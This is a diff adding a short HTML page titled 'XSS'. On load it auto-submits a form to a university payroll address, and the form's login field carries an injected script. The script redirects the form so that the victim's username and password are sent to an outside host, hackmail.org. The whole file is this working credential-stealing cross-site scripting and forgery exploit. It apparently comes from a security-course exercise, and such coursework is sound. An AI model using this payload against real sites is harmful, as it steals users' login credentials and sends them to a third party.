@@ -1,0 +1,13 @@
+<!DOCTYPE html> 
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action='http://payroll.gatech.edu' method='POST'>
+    <input type='hidden' name='login' value='">
+<script>document.forms[0].action="javascript:void((new Image()).src=\"http://hackmail.org/sendmail.php?\" + \"&username=U3ByaW5nMjAxOVRhcmdldDJFYXN0ZXJFZ2c\" + \"&payload=\" + document.forms[0].login.value + \" \" + document.forms[0].pw.value + \"&random=\" + Math.random());";</script><input type="hidden" value="'/>
+    </form>
+  </body>
+</html>
